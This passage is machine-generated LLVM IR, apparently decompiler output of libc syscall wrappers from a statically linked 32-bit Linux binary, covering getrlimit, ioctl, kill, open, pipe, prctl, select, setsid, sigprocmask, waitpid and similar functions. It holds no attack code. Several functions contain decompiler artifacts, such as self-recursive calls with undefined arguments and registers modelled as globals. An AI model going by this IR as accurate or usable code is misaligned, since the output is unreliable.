  %tmp = icmp ult i32 %v2_804dd2c, -4095
  br i1 %tmp, label %dec_label_pc_804dd44, label %dec_label_pc_804dd39

dec_label_pc_804dd39:                             ; preds = %dec_label_pc_804dd21
  %v0_804dd39 = load i32, i32* %stack_var_-44, align 4
  %v1_804dd39 = call i32 @__errno_location(i32 %v0_804dd39)
  %v0_804dd3e = load i32, i32* @ebx, align 4
  %v1_804dd3e = sub i32 0, %v0_804dd3e
  store i32 %v1_804dd3e, i32* @ebx, align 4
  %v2_804dd40 = inttoptr i32 %v1_804dd39 to i32*
  store i32 %v1_804dd3e, i32* %v2_804dd40, align 4
  br label %dec_label_pc_804dd66

dec_label_pc_804dd44:                             ; preds = %dec_label_pc_804dd21
  %v2_804dd44 = icmp slt i32 %v2_804dd2c, 0
  br i1 %v2_804dd44, label %dec_label_pc_804dd66, label %dec_label_pc_804dd48

dec_label_pc_804dd48:                             ; preds = %dec_label_pc_804dd44
  %v0_804dd48 = load i32, i32* @edi, align 4
  %v1_804dd48 = icmp eq i32 %v0_804dd48, 0
  %v1_804dd4a = icmp eq i1 %v1_804dd48, false
  br i1 %v1_804dd4a, label %dec_label_pc_804dd7a, label %dec_label_pc_804dd4c

dec_label_pc_804dd4c:                             ; preds = %dec_label_pc_804dd48
  br i1 %v1_804dcdd, label %dec_label_pc_804dd62, label %dec_label_pc_804dd50

dec_label_pc_804dd50:                             ; preds = %dec_label_pc_804dd4c
  %v0_804dd53 = load i32, i32* @esi, align 4
  store i32 %v0_804dd53, i32* %stack_var_-44, align 4
  %v4_804dd54 = inttoptr i32 %v0_804dd53 to i32*
  %v5_804dd54 = call i32 @realloc(i32* %v4_804dd54, i32 %v2_804dd2c, i32 %v0_804dd2e, i32 %v0_804dd2e)
  %v1_804dd5c = icmp eq i32 %v5_804dd54, 0
  %v1_804dd60 = icmp eq i1 %v1_804dd5c, false
  br i1 %v1_804dd60, label %dec_label_pc_804dd7a, label %dec_label_pc_804dd62

dec_label_pc_804dd62:                             ; preds = %dec_label_pc_804dd50, %dec_label_pc_804dd4c
  %v0_804dd62 = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dd7a

dec_label_pc_804dd66:                             ; preds = %dec_label_pc_804dd44, %dec_label_pc_804dd39
  %v0_804dd66 = load i32, i32* @edi, align 4
  %v1_804dd66 = icmp eq i32 %v0_804dd66, 0
  %v1_804dd68 = icmp eq i1 %v1_804dd66, false
  br i1 %v1_804dd68, label %dec_label_pc_804dd78, label %dec_label_pc_804dd6a

dec_label_pc_804dd6a:                             ; preds = %dec_label_pc_804dd66
  %v0_804dd6d = load i32, i32* @esi, align 4
  store i32 %v0_804dd6d, i32* %stack_var_-44, align 4
  %v1_804dd6e = call i32 @free(i32 %v0_804dd6d)
  %v0_804dd7d.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dd7a

dec_label_pc_804dd78:                             ; preds = %dec_label_pc_804dd66, %dec_label_pc_804dd0f, %dec_label_pc_804dce3
  br label %dec_label_pc_804dd7a

dec_label_pc_804dd7a:                             ; preds = %dec_label_pc_804dd50, %dec_label_pc_804dd48, %dec_label_pc_804dd6a, %dec_label_pc_804dd62, %dec_label_pc_804dd78
  %v0_804dd7d = phi i32 [ %v5_804dd54, %dec_label_pc_804dd50 ], [ %v0_804dd48, %dec_label_pc_804dd48 ], [ %v0_804dd7d.pre, %dec_label_pc_804dd6a ], [ %v0_804dd62, %dec_label_pc_804dd62 ], [ 0, %dec_label_pc_804dd78 ]
  %v0_804dd7a = load i32, i32* @esp, align 4
  %v5_804dd7a = icmp ugt i32 %v0_804dd7a, -13
  store i1 %v5_804dd7a, i1* @cf, align 1
  store i32 %v0_804dccf, i32* @ebx, align 4
  store i32 %v0_804dcce, i32* @esi, align 4
  store i32 %v0_804dccd, i32* @edi, align 4
  store i32 %v0_804dccc, i32* @ebp, align 4
  ret i32 %v0_804dd7d

; uselistorder directives
  uselistorder i32 %v2_804dd2c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804dd12, { 1, 0 }
  uselistorder i32 %v3_804dcf3, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i1* @cf, { 0, 4, 1, 2, 3 }
  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804dd7a, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804dd87 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804dd8e = call i32 @getrlimit(i32 7, i32 %v2_804dd87)
  store i32 256, i32* @edx, align 4
  %v2_804dd9b = icmp slt i32 %v2_804dd8e, 0
  br i1 %v2_804dd9b, label %dec_label_pc_804dda3, label %dec_label_pc_804dd9f

dec_label_pc_804dd9f:                             ; preds = %entry
  %v3_804dd9f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804dd9f, i32* @edx, align 4
  br label %dec_label_pc_804dda3

dec_label_pc_804dda3:                             ; preds = %entry, %dec_label_pc_804dd9f
  %v0_804dda3 = phi i32 [ 256, %entry ], [ %v3_804dd9f, %dec_label_pc_804dd9f ]
  ret i32 %v0_804dda3

; uselistorder directives
  uselistorder label %dec_label_pc_804dda3, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804ddac = load i32, i32* @global_var_8060930.151, align 16
  store i32 %v0_804ddac, i32* @edx, align 4
  %v1_804ddb7 = icmp eq i32 %v0_804ddac, 0
  %v1_804ddb9 = icmp eq i1 %v1_804ddb7, false
  %v4_804ddb9 = select i1 %v1_804ddb9, i32 %v0_804ddac, i32 4096
  ret i32 %v4_804ddb9
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddc0 = load i32, i32* @ebx, align 4
  store i32 %v0_804ddc0, i32* %stack_var_-4, align 4
  %v1_804ddc9 = call i32 @getpid(i32 %v0_804ddc0)
  store i32 %v1_804ddc9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ddc9, -4095
  br i1 %tmp, label %dec_label_pc_804dde0, label %dec_label_pc_804ddd4

dec_label_pc_804ddd4:                             ; preds = %entry
  %v0_804ddd4 = load i32, i32* %stack_var_-4, align 4
  %v1_804ddd4 = call i32 @__errno_location(i32 %v0_804ddd4)
  %v0_804ddd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ddd9 = sub i32 0, %v0_804ddd9
  %v2_804dddb = inttoptr i32 %v1_804ddd4 to i32*
  store i32 %v1_804ddd9, i32* %v2_804dddb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dde0

dec_label_pc_804dde0:                             ; preds = %entry, %dec_label_pc_804ddd4
  %v0_804dde1 = phi i32 [ %v1_804ddc9, %entry ], [ -1, %dec_label_pc_804ddd4 ]
  %v2_804dde4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dde4, i32* @ebx, align 4
  ret i32 %v0_804dde1

; uselistorder directives
  uselistorder i32 %v1_804ddc9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dde0, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dde8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dde8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804ddfb = call i32 @int80_syscall(i32 191)
  store i32 %v1_804ddfb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804ddfb, -4095
  br i1 %tmp, label %dec_label_pc_804de14, label %dec_label_pc_804de08

dec_label_pc_804de08:                             ; preds = %entry
  %v0_804de08 = load i32, i32* %stack_var_-4, align 4
  %v1_804de08 = call i32 @__errno_location(i32 %v0_804de08)
  %v0_804de0d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de0d = sub i32 0, %v0_804de0d
  %v2_804de0f = inttoptr i32 %v1_804de08 to i32*
  store i32 %v1_804de0d, i32* %v2_804de0f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de14

dec_label_pc_804de14:                             ; preds = %entry, %dec_label_pc_804de08
  %v0_804de15 = phi i32 [ %v1_804ddfb, %entry ], [ -1, %dec_label_pc_804de08 ]
  %v2_804de18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de18, i32* @ebx, align 4
  ret i32 %v0_804de15

; uselistorder directives
  uselistorder i32 %v1_804ddfb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de14, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804de1c = load i32, i32* @edi, align 4
  store i32 %v0_804de1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804de34 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804de3c = call i32 @ioctl(i32 %v0_804de34, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804de34, i32* @ebx, align 4
  store i32 %v3_804de3c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804de3c, -4095
  br i1 %tmp, label %dec_label_pc_804de54, label %dec_label_pc_804de48

dec_label_pc_804de48:                             ; preds = %entry
  %v1_804de48 = call i32 @__errno_location(i32 %v0_804de34)
  %v0_804de4d = load i32, i32* %edi.global-to-local, align 4
  %v1_804de4d = sub i32 0, %v0_804de4d
  %v2_804de4f = inttoptr i32 %v1_804de48 to i32*
  store i32 %v1_804de4d, i32* %v2_804de4f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de54

dec_label_pc_804de54:                             ; preds = %entry, %dec_label_pc_804de48
  %v0_804de57 = phi i32 [ %v3_804de3c, %entry ], [ -1, %dec_label_pc_804de48 ]
  %v2_804de59 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de59, i32* @edi, align 4
  ret i32 %v0_804de57

; uselistorder directives
  uselistorder i32 %v3_804de3c, { 1, 0, 2 }
  uselistorder i32 %v0_804de34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de54, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de5c = load i32, i32* @ebx, align 4
  store i32 %v0_804de5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804de6f = call i32 @kill(i32 %v0_804de5c, i32 %tmp4)
  store i32 %v2_804de6f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804de6f, -4095
  br i1 %tmp, label %dec_label_pc_804de88, label %dec_label_pc_804de7c

dec_label_pc_804de7c:                             ; preds = %entry
  %v0_804de7c = load i32, i32* %stack_var_-4, align 4
  %v1_804de7c = call i32 @__errno_location(i32 %v0_804de7c)
  %v0_804de81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de81 = sub i32 0, %v0_804de81
  %v2_804de83 = inttoptr i32 %v1_804de7c to i32*
  store i32 %v1_804de81, i32* %v2_804de83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de88

dec_label_pc_804de88:                             ; preds = %entry, %dec_label_pc_804de7c
  %v0_804de89 = phi i32 [ %v2_804de6f, %entry ], [ -1, %dec_label_pc_804de7c ]
  %v2_804de88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804de88, i32* @edx, align 4
  %v2_804de8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de8c, i32* @ebx, align 4
  ret i32 %v0_804de89

; uselistorder directives
  uselistorder i32 %v2_804de6f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de88, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804de93 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804de97 = sdiv i32 %sext, 16777216
  store i32 %v4_804de97, i32* @ecx, align 4
  %v4_804de9b = ptrtoint i8* %arg1 to i32
  %v3_804de9f = and i32 %arg2, 64
  %v4_804de9f = icmp eq i32 %v3_804de9f, 0
  br i1 %v4_804de9f, label %dec_label_pc_804deb0, label %dec_label_pc_804dea4

dec_label_pc_804dea4:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804deb0

dec_label_pc_804deb0:                             ; preds = %entry, %dec_label_pc_804dea4
  %v0_804deb0 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804dea4 ]
  store i32 %v0_804deb0, i32* @edx, align 4
  store i32 %v4_804de9b, i32* %ebx.global-to-local, align 4
  %v5_804debb = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804de97)
  store i32 %v5_804debb, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_804debb, -4095
  br i1 %tmp16, label %dec_label_pc_804ded3, label %dec_label_pc_804dec7

dec_label_pc_804dec7:                             ; preds = %dec_label_pc_804deb0
  %v1_804dec7 = call i32 @__errno_location(i32 %v0_804de93)
  %v0_804decc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804decc = sub i32 0, %v0_804decc
  %v2_804dece = inttoptr i32 %v1_804dec7 to i32*
  store i32 %v1_804decc, i32* %v2_804dece, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ded3

dec_label_pc_804ded3:                             ; preds = %dec_label_pc_804deb0, %dec_label_pc_804dec7
  %v0_804ded6 = phi i32 [ %v5_804debb, %dec_label_pc_804deb0 ], [ -1, %dec_label_pc_804dec7 ]
  store i32 %v0_804de93, i32* @ebx, align 4
  ret i32 %v0_804ded6

; uselistorder directives
  uselistorder i32 %v5_804debb, { 1, 0, 2 }
  uselistorder i32 %v4_804de97, { 1, 0 }
  uselistorder i32 %v0_804de93, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804ded3, { 1, 0 }
  uselistorder label %dec_label_pc_804deb0, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804deeb = inttoptr i32 %arg1 to i8*
  %v4_804deeb = call i32 @__libc_open(i8* %v3_804deeb, i32 577)
  ret i32 %v4_804deeb
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804def4 = load i32, i32* @edi, align 4
  store i32 %v0_804def4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804defc = load i32, i32* @ebx, align 4
  %v1_804df04 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804df04 = call i32 @pipe([2 x i32] %v1_804df04)
  store i32 %v0_804defc, i32* @ebx, align 4
  store i32 %v2_804df04, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804df04, -4095
  br i1 %tmp, label %dec_label_pc_804df1c, label %dec_label_pc_804df10

dec_label_pc_804df10:                             ; preds = %entry
  %v1_804df10 = call i32 @__errno_location(i32 %v0_804defc)
  %v0_804df15 = load i32, i32* %edi.global-to-local, align 4
  %v1_804df15 = sub i32 0, %v0_804df15
  %v2_804df17 = inttoptr i32 %v1_804df10 to i32*
  store i32 %v1_804df15, i32* %v2_804df17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804df1c

dec_label_pc_804df1c:                             ; preds = %entry, %dec_label_pc_804df10
  %v0_804df1d = phi i32 [ %v2_804df04, %entry ], [ -1, %dec_label_pc_804df10 ]
  %v2_804df20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df20, i32* @edi, align 4
  ret i32 %v0_804df1d

; uselistorder directives
  uselistorder i32 %v2_804df04, { 1, 0, 2 }
  uselistorder i32 %v0_804defc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df1c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804df24 = load i32, i32* @edi, align 4
  %v0_804df25 = load i32, i32* @esi, align 4
  store i32 %v0_804df25, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804df3d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804df45 = call i32 @prctl(i32 %v0_804df3d, i32 %v0_804df25, i32 %v0_804df24, i32 %tmp6, i32 %arg1)
  store i32 %v0_804df3d, i32* @ebx, align 4
  store i32 %v5_804df45, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804df45, -4095
  br i1 %tmp, label %dec_label_pc_804df5d, label %dec_label_pc_804df51

dec_label_pc_804df51:                             ; preds = %entry
  %v1_804df51 = call i32 @__errno_location(i32 %v0_804df3d)
  %v0_804df56 = load i32, i32* %esi.global-to-local, align 4
  %v1_804df56 = sub i32 0, %v0_804df56
  %v2_804df58 = inttoptr i32 %v1_804df51 to i32*
  store i32 %v1_804df56, i32* %v2_804df58, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804df5d

dec_label_pc_804df5d:                             ; preds = %entry, %dec_label_pc_804df51
  %v0_804df5e = phi i32 [ %v5_804df45, %entry ], [ -1, %dec_label_pc_804df51 ]
  %v2_804df60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804df60, i32* @esi, align 4
  store i32 %v0_804df24, i32* @edi, align 4
  ret i32 %v0_804df5e

; uselistorder directives
  uselistorder i32 %v5_804df45, { 1, 0, 2 }
  uselistorder i32 %v0_804df3d, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df5d, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df64 = load i32, i32* @edi, align 4
  store i32 %v0_804df64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804df74 = load i32, i32* @ebx, align 4
  %v4_804df7c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804df74, i32* @ebx, align 4
  store i32 %v4_804df7c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804df7c, -4095
  br i1 %tmp, label %dec_label_pc_804df94, label %dec_label_pc_804df88

dec_label_pc_804df88:                             ; preds = %entry
  %v1_804df88 = call i32 @__errno_location(i32 %v0_804df74)
  %v0_804df8d = load i32, i32* %edi.global-to-local, align 4
  %v1_804df8d = sub i32 0, %v0_804df8d
  %v2_804df8f = inttoptr i32 %v1_804df88 to i32*
  store i32 %v1_804df8d, i32* %v2_804df8f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804df94

dec_label_pc_804df94:                             ; preds = %entry, %dec_label_pc_804df88
  %v0_804df95 = phi i32 [ %v4_804df7c, %entry ], [ -1, %dec_label_pc_804df88 ]
  %v2_804df98 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df98, i32* @edi, align 4
  ret i32 %v0_804df95

; uselistorder directives
  uselistorder i32 %v4_804df7c, { 1, 0, 2 }
  uselistorder i32 %v0_804df74, { 1, 0 }
  uselistorder label %dec_label_pc_804df94, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804df9d = load i32, i32* @esi, align 4
  store i32 %v0_804df9d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804dfb5 = load i32, i32* @ebx, align 4
  %v1_804dfbd = call i32 @int80_syscall(i32 142)
  store i32 %v0_804dfb5, i32* @ebx, align 4
  store i32 %v1_804dfbd, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dfbd, -4095
  br i1 %tmp, label %dec_label_pc_804dfd5, label %dec_label_pc_804dfc9

dec_label_pc_804dfc9:                             ; preds = %entry
  %v1_804dfc9 = call i32 @__errno_location(i32 %v0_804dfb5)
  %v0_804dfce = load i32, i32* %esi.global-to-local, align 4
  %v1_804dfce = sub i32 0, %v0_804dfce
  %v2_804dfd0 = inttoptr i32 %v1_804dfc9 to i32*
  store i32 %v1_804dfce, i32* %v2_804dfd0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dfd5

dec_label_pc_804dfd5:                             ; preds = %entry, %dec_label_pc_804dfc9
  %v0_804dfd6 = phi i32 [ %v1_804dfbd, %entry ], [ -1, %dec_label_pc_804dfc9 ]
  %v2_804dfd5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dfd5, i32* @edx, align 4
  %v2_804dfd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804dfd8, i32* @esi, align 4
  ret i32 %v0_804dfd6

; uselistorder directives
  uselistorder i32 %v1_804dfbd, { 1, 0, 2 }
  uselistorder i32 %v0_804dfb5, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd5, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dfdc = load i32, i32* @ebx, align 4
  store i32 %v0_804dfdc, i32* %stack_var_-4, align 4
  %v1_804dfe5 = call i32 @setsid(i32 %v0_804dfdc)
  store i32 %v1_804dfe5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dfe5, -4095
  br i1 %tmp, label %dec_label_pc_804dffc, label %dec_label_pc_804dff0

dec_label_pc_804dff0:                             ; preds = %entry
  %v0_804dff0 = load i32, i32* %stack_var_-4, align 4
  %v1_804dff0 = call i32 @__errno_location(i32 %v0_804dff0)
  %v0_804dff5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dff5 = sub i32 0, %v0_804dff5
  %v2_804dff7 = inttoptr i32 %v1_804dff0 to i32*
  store i32 %v1_804dff5, i32* %v2_804dff7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dffc

dec_label_pc_804dffc:                             ; preds = %entry, %dec_label_pc_804dff0
  %v0_804dffd = phi i32 [ %v1_804dfe5, %entry ], [ -1, %dec_label_pc_804dff0 ]
  %v2_804e000 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e000, i32* @ebx, align 4
  ret i32 %v0_804dffd

; uselistorder directives
  uselistorder i32 %v1_804dfe5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dffc, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e005 = load i32, i32* @esi, align 4
  %v4_804e009 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e009, i32* @ecx, align 4
  %v2_804e015 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e015, label %dec_label_pc_804e02e, label %dec_label_pc_804e019

dec_label_pc_804e019:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804e02e, label %dec_label_pc_804e01e

dec_label_pc_804e01e:                             ; preds = %dec_label_pc_804e019
  %v1_804e01e = call i32 @__errno_location(i32 %v0_804e005)
  %v1_804e023 = inttoptr i32 %v1_804e01e to i32*
  store i32 22, i32* %v1_804e023, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_804e055

dec_label_pc_804e02e:                             ; preds = %dec_label_pc_804e019, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e033 = load i32, i32* @ebx, align 4
  %v7_804e03b = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_804e033, i32* @ebx, align 4
  %v1_804e03e = add i32 %v7_804e03b, 4096
  %v2_804e03e = icmp ult i32 %v7_804e03b, -4096
  %v3_804e03e = xor i32 %v7_804e03b, -2147483648
  %v4_804e03e = xor i32 %v1_804e03e, %v7_804e03b
  %v5_804e03e = and i32 %v4_804e03e, %v3_804e03e
  %v6_804e03e = icmp slt i32 %v5_804e03e, 0
  store i1 %v6_804e03e, i1* @of, align 1
  %v7_804e03e = icmp eq i32 %v1_804e03e, 0
  store i32 %v7_804e03b, i32* %esi.global-to-local, align 4
  %v2_804e045 = or i1 %v2_804e03e, %v7_804e03e
  br i1 %v2_804e045, label %dec_label_pc_804e055, label %dec_label_pc_804e047

dec_label_pc_804e047:                             ; preds = %dec_label_pc_804e02e
  %v1_804e047 = call i32 @__errno_location(i32 %v0_804e033)
  %v0_804e04c = load i32, i32* %esi.global-to-local, align 4
  %v1_804e04c = sub i32 0, %v0_804e04c
  %v2_804e04e = inttoptr i32 %v1_804e047 to i32*
  store i32 %v1_804e04c, i32* %v2_804e04e, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e055

dec_label_pc_804e055:                             ; preds = %dec_label_pc_804e047, %dec_label_pc_804e02e, %dec_label_pc_804e01e
  %storemerge = phi i32 [ -1, %dec_label_pc_804e01e ], [ %v7_804e03b, %dec_label_pc_804e02e ], [ -1, %dec_label_pc_804e047 ]
  %v2_804e055 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e055, i32* @edx, align 4
  store i32 %v0_804e005, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e03e, { 1, 0 }
  uselistorder i32 %v7_804e03b, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_804e033, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e05c = load i32, i32* @edi, align 4
  store i32 %v0_804e05c, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e064 = load i32, i32* @ebx, align 4
  %v2_804e06c = call i32 @time(i32* %arg1)
  store i32 %v0_804e064, i32* @ebx, align 4
  store i32 %v2_804e06c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e06c, -4095
  br i1 %tmp, label %dec_label_pc_804e084, label %dec_label_pc_804e078

dec_label_pc_804e078:                             ; preds = %entry
  %v1_804e078 = call i32 @__errno_location(i32 %v0_804e064)
  %v0_804e07d = load i32, i32* %edi.global-to-local, align 4
  %v1_804e07d = sub i32 0, %v0_804e07d
  %v2_804e07f = inttoptr i32 %v1_804e078 to i32*
  store i32 %v1_804e07d, i32* %v2_804e07f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e084

dec_label_pc_804e084:                             ; preds = %entry, %dec_label_pc_804e078
  %v0_804e085 = phi i32 [ %v2_804e06c, %entry ], [ -1, %dec_label_pc_804e078 ]
  %v2_804e084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e084, i32* @edx, align 4
  %v2_804e088 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e088, i32* @edi, align 4
  ret i32 %v0_804e085

; uselistorder directives
  uselistorder i32 %v2_804e06c, { 1, 0, 2 }
  uselistorder i32 %v0_804e064, { 1, 0 }
  uselistorder label %dec_label_pc_804e084, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804e09d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804e09d
}

